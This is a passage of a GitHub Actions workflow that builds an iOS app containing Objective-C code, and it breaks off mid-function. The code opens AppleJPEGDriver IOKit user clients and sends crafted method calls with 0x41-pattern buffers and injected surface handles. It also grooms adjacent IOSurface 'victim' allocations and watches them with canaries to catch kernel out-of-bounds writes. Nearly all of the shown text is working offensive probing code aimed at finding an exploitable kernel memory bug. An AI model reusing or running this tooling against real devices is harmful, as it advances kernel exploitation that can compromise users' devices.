name: build
on: [push, workflow_dispatch]

permissions:
  contents: read
  actions: write

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  ipa:
    runs-on: macos-15
    timeout-minutes: 20
    steps:
      - name: runner
        run: |
          sw_vers
          xcodebuild -version
          SDK="$(xcrun --sdk iphoneos --show-sdk-path)"
          echo "sdk=$SDK"
          ls -la "$SDK/System/Library/PrivateFrameworks/IOSurface.framework" 2>/dev/null || echo "private absent"
          ls -la "$SDK/System/Library/Frameworks/IOSurface.framework" 2>/dev/null || echo "public absent"
          df -h /

      - name: source
        run: |
          mkdir -p Sources stub/IOSurface out/Payload/probe.app
          cat > stub/IOSurface/IOSurface.h <<'STUBEOF'
          #ifndef PROBE_STUB_IOSURFACE_H
          #define PROBE_STUB_IOSURFACE_H
          #include <stdint.h>
          #include <stddef.h>
          #include <CoreFoundation/CoreFoundation.h>
          typedef struct __IOSurface *IOSurfaceRef;
          uint32_t IOSurfaceGetID(IOSurfaceRef buffer);
          size_t IOSurfaceGetAllocSize(IOSurfaceRef buffer);
          void *IOSurfaceGetBaseAddress(IOSurfaceRef buffer);
          size_t IOSurfaceGetBytesPerRow(IOSurfaceRef buffer);
          IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
          kern_return_t IOSurfaceLock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);
          kern_return_t IOSurfaceUnlock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);
          IOSurfaceRef IOSurfaceLookup(uint32_t csid);
          #endif
          STUBEOF
          wc -c stub/IOSurface/IOSurface.h

          cat > Sources/main.m <<'MAINEOF'
          #import <UIKit/UIKit.h>
          #import <IOKit/IOKitLib.h>
          #import <VideoToolbox/VideoToolbox.h>
          #import <CoreVideo/CoreVideo.h>
          #import <IOSurface/IOSurface.h>
          #import <Security/Security.h>
          #import <mach/mach.h>
          #include <unistd.h>
          #include <fcntl.h>
          #include <signal.h>
          #include <pthread.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdio.h>
          #include <stdarg.h>
          #include <stdint.h>
          #include <dlfcn.h>
          #include <sys/utsname.h>
          #include <sys/sysctl.h>

          extern int csops(pid_t pid, unsigned int ops, void* uaddr, size_t usize);

          typedef IOSurfaceRef (*fn_surfcreate)(CFDictionaryRef);
          typedef kern_return_t (*fn_surflock)(IOSurfaceRef, uint32_t, uint32_t*);
          typedef kern_return_t (*fn_surfunlock)(IOSurfaceRef, uint32_t, uint32_t*);
          typedef size_t (*fn_allocusize)(IOSurfaceRef);
          typedef void* (*fn_baseaddr)(IOSurfaceRef);
          typedef uint32_t (*fn_surfid)(IOSurfaceRef);
          typedef IOSurfaceRef (*fn_getsurf)(CVPixelBufferRef);
          typedef kern_return_t (*fn_addclient)(io_connect_t, io_connect_t);

          static fn_surfcreate g_surfcreate = NULL;
          static fn_surflock g_surflock = NULL;
          static fn_surfunlock g_surfunlock = NULL;
          static fn_allocusize g_allocusize = NULL;
          static fn_baseaddr g_baseaddr = NULL;
          static fn_surfid g_surfid = NULL;
          static fn_getsurf g_getsurf = NULL;
          static fn_addclient g_addclient = NULL;

          #define BUILD_TAG "v56-childs"
          #define MAXC 96
          #define STEP_MAX 23
          #define TRY_MAX 2
          #define MAXCHILD 8
          #define VIC_MAX 72
          #define FIXED 4096
          #define BIGOUT 16
          #define SEL_N 64
          #define SCO 16
          #define SVC_N 6
          #define SV_N 12
          #define PAT 0x41
          #define AAM 0xAA
          #define DELTA 0x4000

          static UITextView* g_tv;
          static UILabel* g_hb;
          static NSMutableArray* g_lines;
          static volatile int g_hits = 0, g_done = 0;
          static volatile int g_step = 0;
          static volatile int g_stop = 0;
          static volatile int g_vt_done = 0;
          static volatile int g_probes = 0;
          static volatile int g_hdlvalid = 0;
          static volatile int g_relive = 0;
          static volatile int g_ssw_hit = 0;
          static volatile int g_s0nz = 0;
          static volatile int g_canary_w = 0;
          static volatile int g_canary_dirty = 0;
          static volatile int g_oobsz = 0;
          static volatile int g_gapread = 0;
          static volatile int g_cls_err = 0;
          static int g_try = 0;
          static int g_fd = -1;
          static int g_nchild = 0;
          static int g_root_idx = -1;
          static int g_best = -1;
          static int g_s4ci = -1;
          static int g_err[3] = {0};
          static int g_vicn = 0;
          static int g_pairn = 0;
          static int g_pair[24][3];
          static size_t g_valloc[VIC_MAX];
          static uint32_t g_sid = 0;
          static uint64_t g_hdl = 0;
          static io_service_t g_root = 0;
          static io_service_t g_child[MAXCHILD + 1];
          static IOSurfaceRef g_vic[VIC_MAX];
          static NSMutableSet* g_seen;
          static pthread_mutex_t g_lk = PTHREAD_MUTEX_INITIALIZER;
          static VTCompressionSessionRef g_vt = NULL;
          static CVPixelBufferRef g_surf = NULL;
          static mach_port_t g_wake = MACH_PORT_NULL;
          static uint8_t* g_zbuf = NULL;

          static io_connect_t g_conn[MAXC];
          static uint32_t g_ctype[MAXC];
          static int g_kind[MAXC];
          static int g_node[MAXC];
          static int g_nconn = 0;

          static int g_resp[SEL_N];
          static int g_nlive = 0;

          static uint64_t SV[SV_N] = { 0, 1, 2, 18, 24, 64, 1920, 1080, 4096, 0x1000ULL, 0x10000ULL, 0x4141414141414141ULL };
          static const char* SVC[SVC_N] = {
              "AppleJPEGDriver", "AppleJPEGDriverUserClient", "AppleJPEGDecoder",
              "AppleJPEGEncoder", "AppleJPEGAccelerator", "AppleJPEGInterface"
          };

          static const char* STEP_NAME[STEP_MAX + 1] = {
              "boot", "census", "sig-blob", "dev-info", "tree-up", "svc-open",
              "dump-tree", "prop-dump", "vt-init", "vt-encode", "root-open",
              "child-open", "s4-classify", "surf-alloc", "canary-sync", "canary-async",
              "canary-in", "s4-args", "gap-probe", "null-mix", "sel-sweep", "s0-scalars",
              "summary", "verdict"
          };

          static void ulog(NSString* fmt, ...) {
              va_list ap; va_start(ap, fmt);
              NSString* s = [[NSString alloc] initWithFormat:fmt arguments:ap];
              va_end(ap);
              dispatch_async(dispatch_get_main_queue(), ^{
                  [g_lines addObject:s];
                  if (g_lines.count > 260) [g_lines removeObjectsInRange:NSMakeRange(0, 52)];
              });
          }
          static void plog(NSString* fmt, ...) {
              if (g_fd < 0) return;
              va_list ap; va_start(ap, fmt);
              NSString* s = [[NSString alloc] initWithFormat:fmt arguments:ap];
              va_end(ap);
              NSData* d = [[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
              pthread_mutex_lock(&g_lk);
              write(g_fd, d.bytes, d.length);
              pthread_mutex_unlock(&g_lk);
          }
          static void flush_ui(void) {
              g_tv.text = [g_lines componentsJoinedByString:@"\n"];
              if (g_lines.count) [g_tv scrollRangeToVisible:NSMakeRange(g_tv.text.length, 0)];
          }
          static void sigh(int sig) {
              char b[96];
              int n = snprintf(b, sizeof(b), "SIGNAL %d at step %d (%s)\n", sig, g_step, STEP_NAME[g_step < STEP_MAX+1 ? g_step : STEP_MAX]);
              if (g_fd >= 0) { write(g_fd, b, n); fsync(g_fd); }
              signal(sig, SIG_DFL);
              raise(sig);
          }
          static NSString* kr_name(kern_return_t kr) {
              switch (kr) {
                  case KERN_SUCCESS: return @"OK";
                  case 0xe00002bc: return @"Error";
                  case 0xe00002bd: return @"NoMem";
                  case 0xe00002be: return @"NoRes";
                  case 0xe00002c1: return @"NotPriv";
                  case 0xe00002c2: return @"BadArg";
                  case 0xe00002c5: return @"Excl";
                  case 0xe00002c7: return @"Unsup";
                  case 0xe00002cc: return @"NotOpen";
                  case 0xe00002d4: return @"Busy";
                  case 0xe00002e2: return @"NotPerm";
                  case 0xe00002f0: return @"NotFound";
                  default: return [NSString stringWithFormat:@"0x%x", kr];
              }
          }
          static NSString* hexn(const uint8_t* p, size_t n, size_t cap) {
              if (!n) return @"-";
              if (n > cap) n = cap;
              NSMutableString* s = [NSMutableString string];
              for (size_t i = 0; i < n; i++) [s appendFormat:@"%02x", p[i]];
              return s;
          }
          static NSString* doc_file(const char* f) {
              NSString* d = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
              return [d stringByAppendingPathComponent:@(f)];
          }
          static void doc_path(const char* f, char* b, size_t n) {
              NSString* p = doc_file(f);
              strncpy(b, p.UTF8String, n - 1);
              b[n - 1] = 0;
          }
          static int load_step(void) {
              NSString* s = [NSString stringWithContentsOfFile:doc_file("step.txt") encoding:NSUTF8StringEncoding error:nil];
              return s ? s.intValue : 0;
          }
          static void save_step(int v) {
              [[NSString stringWithFormat:@"%d", v] writeToFile:doc_file("step.txt") atomically:YES encoding:NSUTF8StringEncoding error:nil];
          }
          static void load_try(void) {
              g_try = 0;
              NSString* s = [NSString stringWithContentsOfFile:doc_file("try.txt") encoding:NSUTF8StringEncoding error:nil];
              if (!s) return;
              NSArray<NSString*>* f = [s componentsSeparatedByString:@":"];
              if (f.count != 2) return;
              NSString* a = f[0]; NSString* b = f[1];
              if (a.intValue == g_step) g_try = b.intValue;
          }
          static void save_try(void) {
              [[NSString stringWithFormat:@"%d:%d", g_step, g_try] writeToFile:doc_file("try.txt") atomically:YES encoding:NSUTF8StringEncoding error:nil];
          }
          static void latch_build(void) {
              NSString* bt = [NSString stringWithContentsOfFile:doc_file("build.txt") encoding:NSUTF8StringEncoding error:nil];
              if ([bt isEqualToString:@BUILD_TAG]) return;
              unlink(doc_file("state.txt").UTF8String);
              save_step(0); g_try = 0; save_try();
              g_root_idx = -1; g_best = -1; g_s4ci = -1;
              [@BUILD_TAG writeToFile:doc_file("build.txt") atomically:YES encoding:NSUTF8StringEncoding error:nil];
          }
          static void load_state(void) {
              NSString* s = [NSString stringWithContentsOfFile:doc_file("state.txt") encoding:NSUTF8StringEncoding error:nil];
              for (NSString* ln in [s componentsSeparatedByString:@"\n"]) {
                  if ([ln hasPrefix:@"K "]) { [g_seen addObject:[ln substringFromIndex:2]]; continue; }
                  if ([ln hasPrefix:@"HDL s"] && !g_hdlvalid) {
                      NSRange r = [ln rangeOfString:@" = 0x"];
                      if (r.location == NSNotFound) continue;
                      uint64_t v = 0;
                      if (sscanf([ln substringFromIndex:r.location + 5].UTF8String, "%llx", &v) == 1 && v) { g_hdl = v; g_hdlvalid = 1; }
                  }
              }
          }

          static void desc_into(uint8_t* in, size_t n) {
              uint32_t w = 1920, h = 1080, f = 0x42475241, bpr = 7680, pl = 1;
              if (n >= 4) memcpy(in, &g_sid, 4);
              if (n >= 8) memcpy(in + 4, &w, 4);
              if (n >= 12) memcpy(in + 8, &h, 4);
              if (n >= 16) memcpy(in + 12, &f, 4);
              if (n >= 20) memcpy(in + 16, &bpr, 4);
              if (n >= 24) memcpy(in + 20, &pl, 4);
          }
          static void inject(uint64_t* sin, uint32_t sic) {
              if (g_hdlvalid && sic > 0) sin[0] = g_hdl;
          }

          static kern_return_t rawx(io_connect_t c, uint32_t sel, int mode, uint64_t* sin, uint32_t sic,
                                    uint8_t* sinS, size_t zis, int passPtr, uint64_t* sout, size_t* soCnt,
                                    uint8_t* soutS, size_t* soSz) {
              if (mode == 1 && !sinS) { zis = 0; passPtr = 0; }
              uint32_t sc = soCnt ? (uint32_t)*soCnt : 0;
              size_t szb = soSz ? *soSz : 0;
              kern_return_t kr;
              if (mode == 0) {
                  kr = IOConnectCallScalarMethod(c, sel, sin, sic, sout, &sc);
              } else if (mode == 1) {
                  kr = IOConnectCallMethod(c, sel, sin, sic, passPtr ? sinS : NULL, zis, sout, &sc, szb ? soutS : NULL, &szb);
              } else {
                  uint64_t ref = 1;
                  kr = IOConnectCallAsyncMethod(c, sel, g_wake, &ref, 1, sin, sic, passPtr ? sinS : NULL, zis, sout, &sc, szb ? soutS : NULL, &szb);
              }
              if (soCnt) *soCnt = sc;
              if (soSz) *soSz = szb;
              return kr;
          }
          static kern_return_t rawv(io_connect_t c, uint32_t sel, int mode, uint64_t* sin, uint32_t sic,
                                    uint8_t* sinS, size_t zis, uint64_t* sout, size_t* soCnt,
                                    uint8_t* soutS, size_t* soSz) {
              return rawx(c, sel, mode, sin, sic, sinS, zis, zis ? 1 : 0, sout, soCnt, soutS, soSz);
          }
          static kern_return_t hb(void) {
              if (g_best < 0 || g_best >= g_nconn) return (kern_return_t)0xe00002cc;
              uint64_t so[SCO] = {0}; size_t sc = 0; uint8_t sb[64]; size_t szb = 0;
              return rawv(g_conn[g_best], 0, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
          }
          static kern_return_t hb_ci(int ci) {
              if (ci < 0 || ci >= g_nconn) return (kern_return_t)0xe00002cc;
              uint64_t so[SCO] = {0}; size_t sc = 0; uint8_t sb[64]; size_t szb = 0;
              return rawv(g_conn[ci], 0, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
          }

          static void note_ok(uint32_t sel) { if (sel < SEL_N) { g_resp[sel] = 1; g_nlive++; } }

          static int find_root(void) {
              io_iterator_t it = 0;
              if (IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching("AppleJPEGDriver"), &it) != KERN_SUCCESS) return 0;
              int svc = 0; io_service_t s;
              while ((s = IOIteratorNext(it))) { svc++; if (!g_root) g_root = s; else IOObjectRelease(s); }
              IOObjectRelease(it);
              return svc;
          }

          static void census(void) {
              io_iterator_t it = 0;
              if (IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching("IOService"), &it) != KERN_SUCCESS) { ulog(@"no census"); return; }
              NSMutableDictionary* cnt = [NSMutableDictionary dictionary];
              io_object_t o; int n = 0;
              while ((o = IOIteratorNext(it)) && n < 4000) {
                  n++;
                  io_name_t cls; IOObjectGetClass(o, cls);
                  NSString* s = @(cls);
                  if ([s rangeOfString:@"JPEG"].location != NSNotFound) {
                      NSNumber* c = cnt[s]; cnt[s] = @(c.intValue + 1);
                  }
                  IOObjectRelease(o);
              }
              IOObjectRelease(it);
              for (NSString* k in cnt) { NSNumber* c = cnt[k]; plog(@"JCLS %@ x%d", k, c.intValue); ulog(@"JCLS %@", k); }
              plog(@"census=%d jcls=%lu", n, (unsigned long)cnt.count);
              ulog(@"census=%d", n);
          }

          static void dump_sig(void) {
              unsigned int fl = 0;
              int rc = csops(getpid(), 0, &fl, sizeof(fl));
              plog(@"csops rc=%d f=0x%x", rc, fl);
              ulog(@"csops rc=%d f=0x%x", rc, fl);
          }
          static void sysctl_str(const char* key) {
              char b[128]; size_t n = sizeof(b); memset(b, 0, sizeof(b));
              if (sysctlbyname(key, b, &n, NULL, 0) != 0) { plog(@"DEV %s = <err>", key); return; }
              b[sizeof(b) - 1] = 0;
              plog(@"DEV %s = %s", key, b); ulog(@"DEV %s = %s", key, b);
          }
          static void sysctl_u32(const char* key) {
              uint32_t v = 0; size_t n = sizeof(v);
              if (sysctlbyname(key, &v, &n, NULL, 0) != 0) { plog(@"DEV %s = <err>", key); return; }
              plog(@"DEV %s = 0x%x", key, v); ulog(@"DEV %s = 0x%x", key, v);
          }
          static void dev_info(void) {
              struct utsname u; memset(&u, 0, sizeof(u));
              if (uname(&u) == 0) { plog(@"DEV uname %s %s %s", u.machine, u.release, u.version); ulog(@"DEV %s %s", u.machine, u.release); }
              sysctl_str("hw.machine");
              sysctl_str("hw.model");
              sysctl_u32("hw.cpufamily");
              sysctl_u32("hw.cpusubfamily");
              sysctl_str("kern.osversion");
              sysctl_str("kern.osproductversion");
          }
          static void dump_node(io_object_t o, const char* lbl) {
              io_name_t cls; IOObjectGetClass(o, cls);
              plog(@"NODE %s class=%s", lbl, cls); ulog(@"NODE %s %s", lbl, cls);
          }
          static void tree_up(void) {
              if (!g_root) { ulog(@"no root"); return; }
              io_registry_entry_t par = 0;
              if (IORegistryEntryGetParentEntry(g_root, kIOServicePlane, &par) != KERN_SUCCESS || !par) { ulog(@"no parent"); return; }
              io_name_t pc; IOObjectGetClass(par, pc);
              plog(@"PARENT %s", pc); ulog(@"PARENT %s", pc);
              IOObjectRelease(par);
          }
          static void svc_open(void) {
              for (int i = 0; i < SVC_N; i++) {
                  io_iterator_t it = 0;
                  if (IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching(SVC[i]), &it) != KERN_SUCCESS) { plog(@"SVC %s nomatch", SVC[i]); continue; }
                  io_service_t s; int n = 0;
                  while ((s = IOIteratorNext(it))) {
                      n++;
                      if (n == 1) {
                          for (uint32_t t = 0; t <= 8 && g_nconn < MAXC; t++) {
                              io_connect_t c = 0;
                              kern_return_t kr = IOServiceOpen(s, mach_task_self(), t, &c);
                              if (kr == KERN_SUCCESS) {
                                  uint64_t so[SCO] = {0}; size_t sc = 0; uint8_t sb[64]; size_t szb = 0;
                                  kern_return_t k0 = rawv(c, 0, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                                  plog(@"SVC %s t%u s0=%@ so0=%llu", SVC[i], t, kr_name(k0), (unsigned long long)so[0]);
                                  ulog(@"SVC %s t%u %@", SVC[i], t, kr_name(k0));
                                  if (k0 == KERN_SUCCESS) {
                                      g_conn[g_nconn] = c; g_ctype[g_nconn] = t; g_kind[g_nconn] = 1; g_node[g_nconn] = -1 - i;
                                      if (g_best < 0) g_best = g_nconn;
                                      g_nconn++;
                                  } else IOServiceClose(c);
                              }
                          }
                      }
                      IOObjectRelease(s);
                  }
                  IOObjectRelease(it);
                  plog(@"SVC %s count=%d", SVC[i], n);
              }
              ulog(@"svc conns=%d", g_nconn);
          }
          static void dump_tree(void) {
              if (!g_root) { ulog(@"no root"); return; }
              dump_node(g_root, "0");
              io_iterator_t ch = 0;
              if (IORegistryEntryGetChildIterator(g_root, kIOServicePlane, &ch) != KERN_SUCCESS) return;
              io_object_t c;
              while ((c = IOIteratorNext(ch)) && g_nchild < MAXCHILD) { g_nchild++; g_child[g_nchild] = c; char lb[16]; snprintf(lb, sizeof(lb), "c%d", g_nchild); dump_node(c, lb); }
              IOObjectRelease(ch);
              plog(@"children=%d", g_nchild); ulog(@"children=%d", g_nchild);
          }
          static void dump_props(io_object_t o, int node) {
              CFMutableDictionaryRef props = NULL;
              if (IORegistryEntryCreateCFProperties(o, &props, kCFAllocatorDefault, 0) != KERN_SUCCESS || !props) return;
              NSDictionary* d = (__bridge NSDictionary*)props;
              for (id k in d) {
                  NSString* vs = [d[k] description];
                  if (vs.length > 180) vs = [vs substringToIndex:180];
                  plog(@"PROPS %d %@ = %@", node, [k description], vs);
              }
              CFRelease(props);
          }
          static void prop_dump(void) {
              if (!g_root) return;
              dump_props(g_root, 0);
              for (int i = 1; i <= g_nchild; i++) dump_props(g_child[i], i);
              ulog(@"props done");
          }
          static void vt_cb(void* r, void* s, OSStatus st, VTEncodeInfoFlags f, CMSampleBufferRef sb) { g_vt_done = 1; }
          static void vt_start(void) {
              VTCompressionSessionCreate(NULL, 1920, 1080, kCMVideoCodecType_H264, NULL, NULL, NULL, vt_cb, NULL, &g_vt);
              if (g_vt) VTCompressionSessionPrepareToEncodeFrames(g_vt);
          }
          static int vt_encode(void) {
              if (!g_vt) return -1;
              CVPixelBufferRef pb = NULL;
              NSDictionary* a = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
              if (CVPixelBufferCreate(NULL, 1920, 1080, kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)a, &pb) != kCVReturnSuccess) return -2;
              CVPixelBufferLockBaseAddress(pb, 0);
              memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
              CVPixelBufferUnlockBaseAddress(pb, 0);
              VTEncodeInfoFlags fl = 0;
              OSStatus st = VTCompressionSessionEncodeFrame(g_vt, pb, CMTimeMake(1, 30), CMTimeMake(1, 30), NULL, NULL, &fl);
              CVPixelBufferRelease(pb);
              for (int i = 0; i < 300 && !g_vt_done; i++) usleep(10000);
              return (int)st;
          }
          static int surf_make(void) {
              if (g_surf) return 1;
              NSDictionary* p = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
              CVReturn r = CVPixelBufferCreate(NULL, 1920, 1080, kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)p, &g_surf);
              if (r != kCVReturnSuccess || !g_surf) return 0;
              IOSurfaceRef s = g_getsurf ? g_getsurf(g_surf) : NULL;
              g_sid = (s && g_surfid) ? g_surfid(s) : 0;
              if (g_sid) SV[3] = g_sid;
              ulog(@"surf sid=0x%x", g_sid);
              return g_sid ? 1 : 0;
          }
          static void root_open(void) {
              if (!g_root) return;
              for (uint32_t t = 0; t <= 1 && g_nconn < MAXC; t++) {
                  io_connect_t c = 0;
                  kern_return_t kr = IOServiceOpen(g_root, mach_task_self(), t, &c);
                  if (kr != KERN_SUCCESS) continue;
                  g_conn[g_nconn] = c; g_ctype[g_nconn] = t; g_kind[g_nconn] = 0; g_node[g_nconn] = 0;
                  if (g_root_idx < 0) g_root_idx = g_nconn;
                  if (g_best < 0) g_best = g_nconn;
                  g_nconn++;
              }
              ulog(@"root conns=%d", g_nconn);
          }

          static void child_open(void) {
              if (g_nchild == 0) dump_tree();
              if (g_nchild == 0) { ulog(@"no children"); return; }
              for (int n = 1; n <= g_nchild && g_nconn < MAXC; n++) {
                  io_service_t ch = g_child[n];
                  if (!ch) continue;
                  for (uint32_t t = 0; t <= 8 && g_nconn < MAXC; t++) {
                      io_connect_t c = 0;
                      kern_return_t kr = IOServiceOpen(ch, mach_task_self(), t, &c);
                      if (kr != KERN_SUCCESS) { plog(@"CH %d t%u open=%@", n, t, kr_name(kr)); continue; }
                      uint64_t so[SCO] = {0}; size_t sc = 0; uint8_t sb[64]; size_t szb = 0;
                      kern_return_t k0 = rawv(c, 0, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                      plog(@"CH %d t%u open=OK s0=%@ so0=%llu", n, t, kr_name(k0), (unsigned long long)so[0]);
                      ulog(@"CH %d t%u s0=%@", n, t, kr_name(k0));
                      g_conn[g_nconn] = c; g_ctype[g_nconn] = t; g_kind[g_nconn] = 2; g_node[g_nconn] = n;
                      g_nconn++;
                  }
              }
              plog(@"CH total=%d", g_nconn);
              ulog(@"ch total=%d", g_nconn);
          }

          static int can_ci(void) {
              if (g_s4ci >= 0) return g_s4ci;
              for (int i = 0; i < g_nconn; i++) if (g_kind[i] == 2) return i;
              return g_nconn > 0 ? 0 : -1;
          }

          static void s4_classify(void) {
              if (g_nconn == 0) { ulog(@"cls no conns"); return; }
              uint8_t* in = calloc(1, FIXED);
              if (!in) return;
              memset(in, PAT, FIXED);
              desc_into(in, FIXED);
              for (int ci = 0; ci < g_nconn; ci++) {
                  uint64_t sin[SCO] = {0};
                  sin[0] = (uint64_t)g_conn[ci];
                  uint64_t so[SCO] = {0}; size_t sc = 0;
                  uint8_t sb[FIXED]; size_t szb = FIXED;
                  memset(sb, AAM, sizeof(sb));
                  kern_return_t kr = rawx(g_conn[ci], 4, 1, sin, 1, in, FIXED, 1, so, &sc, sb, &szb);
                  __sync_fetch_and_add(&g_done, 1);
                  plog(@"CLS n%d k%d t%u -> %@ sc=%zu szb=%zu", g_node[ci], g_kind[ci], g_ctype[ci], kr_name(kr), sc, szb);
                  ulog(@"CLS n%d k%d -> %@ szb=%zu", g_node[ci], g_kind[ci], kr_name(kr), szb);
                  if (kr == 0xe00002bc) {
                      g_err[g_kind[ci] < 3 ? g_kind[ci] : 2]++;
                      __sync_fetch_and_add(&g_cls_err, 1);
                      if (g_s4ci < 0) { g_s4ci = ci; ulog(@"### S4CI n%d k%d", ci, g_kind[ci]); }
                  } else if (kr == KERN_SUCCESS) {
                      note_ok(4);
                      __sync_fetch_and_add(&g_hits, 1);
                      if (g_s4ci < 0) g_s4ci = ci;
                  }
                  usleep(130);
              }
              free(in);
              plog(@"CLS picked=%d errK0=%d errK1=%d errK2=%d", g_s4ci, g_err[0], g_err[1], g_err[2]);
              ulog(@"CLS picked=%d e0=%d e1=%d e2=%d", g_s4ci, g_err[0], g_err[1], g_err[2]);
          }

          static void vic_fill(int idx, uint8_t v) {
              if (idx < 0 || idx >= g_vicn || !g_vic[idx]) return;
              g_surflock(g_vic[idx], 0, NULL);
              size_t n = g_valloc[idx];
              uint8_t* b = g_baseaddr(g_vic[idx]);
              if (b) memset(b, v, n);
              g_surfunlock(g_vic[idx], 0, NULL);
          }
          static int vic_scan(int idx, size_t* first, size_t* dirty) {
              *first = (size_t)-1; *dirty = 0;
              if (idx < 0 || idx >= g_vicn || !g_vic[idx]) return 0;
              g_surflock(g_vic[idx], 0, NULL);
              uint8_t* b = g_baseaddr(g_vic[idx]);
              size_t n = g_valloc[idx];
              size_t d = 0, f = (size_t)-1;
              if (b) for (size_t i = 0; i < n; i++) if (b[i] != AAM) { d++; if (f == (size_t)-1) f = i; }
              g_surfunlock(g_vic[idx], 0, NULL);
              *first = f; *dirty = d;
              return d ? 1 : 0;
          }

          static void surf_alloc(void) {
              if (!g_surfcreate || !g_surflock || !g_baseaddr || !g_allocusize) { ulog(@"surf syms missing"); return; }
              CFMutableDictionaryRef d = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
              int w = 64, h = 64, bpe = 4, bpr = 256, pf = 0x42475241;
              CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), (__bridge CFTypeRef)@(w));
              CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), (__bridge CFTypeRef)@(h));
              CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), (__bridge CFTypeRef)@(bpe));
              CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(bpr));
              CFDictionarySetValue(d, CFSTR("IOSurfacePixelFormat"), (__bridge CFTypeRef)@(pf));
              CFDictionarySetValue(d, CFSTR("IOSurfaceIsGlobal"), (__bridge CFTypeRef)@YES);

              for (int i = 0; i < VIC_MAX; i++) {
                  IOSurfaceRef s = g_surfcreate(d);
                  if (!s) break;
                  g_vic[g_vicn] = s;
                  g_valloc[g_vicn] = g_allocusize(s);
                  g_vicn++;
              }
              CFRelease(d);
              plog(@"VIC n=%d", g_vicn);
              ulog(@"VIC n=%d", g_vicn);
              if (g_vicn < 4) return;

              uintptr_t prev = 0; size_t psz = 0;
              for (int i = 0; i < g_vicn; i++) {
                  uintptr_t b = (uintptr_t)g_baseaddr(g_vic[i]);
                  size_t sz = g_valloc[i];
                  plog(@"VICB %d base=0x%lx sz=%zu", i, (unsigned long)b, sz);
                  if (prev && b > prev && (b - prev) == DELTA && g_pairn < 24) {
                      g_pair[g_pairn][0] = i - 1; g_pair[g_pairn][1] = i; g_pair[g_pairn][2] = (int)sz;
                      g_pairn++;
                      plog(@"PAIR %d->%d d=0x%lx", i - 1, i, (unsigned long)(b - prev));
                      ulog(@"### PAIR %d->%d d=0x%lx", i - 1, i, (unsigned long)(b - prev));
                  }
                  prev = b; psz = sz;
              }
              plog(@"VIC pairs=%d delta=0x%x", g_pairn, DELTA);
              ulog(@"VIC pairs=%d", g_pairn);
              if (g_pairn == 0) ulog(@"VIC no adjacency");
          }

          static void canary(int mode, size_t zos, size_t zis, const char* tag) {
              int ci = can_ci();
              if (ci < 0) { ulog(@"can %s no conn", tag); return; }
              if (g_pairn == 0) { ulog(@"can %s no pairs", tag); return; }
              ulog(@"can %s via ci=%d n%d k%d", tag, ci, g_node[ci], g_kind[ci]);
              uint8_t* in = NULL;
              if (zis) { in = calloc(1, zis); if (!in) return; memset(in, PAT, zis); desc_into(in, zis); }
              for (int pi = 0; pi < g_pairn; pi++) {
                  int A = g_pair[pi][0], B = g_pair[pi][1];
                  vic_fill(B, AAM);
                  uint64_t sin[SCO] = {0};
                  sin[0] = (uint64_t)g_conn[ci];
                  for (uint32_t k = 1; k < SCO; k++) sin[k] = SV[k % SV_N];
                  uint64_t so[SCO] = {0}; size_t sc = 0;
                  uint8_t sb[FIXED]; size_t szb = zos;
                  memset(sb, AAM, sizeof(sb));
                  kern_return_t kr = rawx(g_conn[ci], 4, mode, sin, 1, in, zis, in ? 1 : 0, so, &sc, sb, &szb);
                  __sync_fetch_and_add(&g_done, 1);
                  __sync_fetch_and_add(&g_probes, 1);
                  size_t first = 0, dirty = 0;
                  int hit = vic_scan(B, &first, &dirty);
                  plog(@"CAN %s p%d/%d A%d B%d m%d zi=%zu zo=%zu -> %@ sc=%zu szb=%zu hit=%d first=0x%zx dirty=%zu so0=%llu sb=%@",
                       tag, pi + 1, g_pairn, A, B, mode, zis, zos, kr_name(kr), sc, szb, hit, first, dirty,
                       (unsigned long long)so[0], hexn(sb, sizeof(sb), 32));
                  ulog(@"CAN %s m%d zi=%zu zo=%zu -> %@ hit=%d first=0x%zx d=%zu szb=%zu", tag, mode, zis, zos, kr_name(kr), hit, first, dirty, szb);
                  if (hit) {
                      __sync_fetch_and_add(&g_canary_w, 1);
                      g_canary_dirty = (int)dirty;
                      ulog(@"!!! CAN %s WRITE first=0x%zx dirty=%zu", tag, first, dirty);
                  }
                  if (szb > zos) {
                      __sync_fetch_and_add(&g_oobsz, 1);
                      ulog(@"!!! CAN %s SZB %zu > offered %zu", tag, szb, zos);
                      plog(@"OOBSZ %s offered=%zu driver=%zu", tag, zos, szb);
                  }
                  if (kr == KERN_SUCCESS) { __sync_fetch_and_add(&g_hits, 1); note_ok(4); }
                  usleep(200);
              }
              free(in);
          }

          static void s4_args(void) {
              int ci = can_ci();
              if (ci < 0) { ulog(@"args no conn"); return; }
              static const size_t ZI[] = { 0, 24, 64, 256, 4096 };
              static const uint32_t SIC[] = { 0, 1, 2, 4 };
              uint8_t* in = calloc(1, 4096);
              if (!in) return;
              for (int m = 1; m <= 2; m++) {
                  for (int si = 0; si < 4; si++) {
                      for (int zi = 0; zi < 5; zi++) {
                          size_t zis = ZI[zi];
                          if (zis) { memset(in, PAT, zis); desc_into(in, zis); }
                          uint64_t sin[SCO] = {0};
